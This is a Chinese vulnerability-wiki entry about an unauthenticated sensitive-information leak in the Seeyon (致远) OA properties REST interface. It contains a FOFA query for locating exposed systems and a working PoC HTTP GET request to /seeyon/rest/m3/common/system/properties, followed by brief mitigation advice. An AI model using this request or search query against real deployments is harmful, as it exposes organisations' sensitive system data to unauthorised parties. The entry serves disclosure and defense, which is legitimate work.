# 致远OA properties接口存在敏感信息泄露漏洞

# 漏洞描述

致远OA 接口 properties 接口处存在信息泄露漏洞，未经身份验证获取敏感信息，使系统处于极不安全的状态。

# 影响版本

致远OA

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="致远互联-OA"

POC/EXP：

GET /seeyon/rest/m3/common/system/properties HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive

![image-20241010094557175](./.resource/致远OAproperties接口存在敏感信息泄露漏洞/media/image-20241010094557175.png)


# 修复方案

**临时缓解方案**

接口设置访问权限或限制访问来源地址，如非必要，不要将系统开放在互联网上。

对接口进行严格的权限校验。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
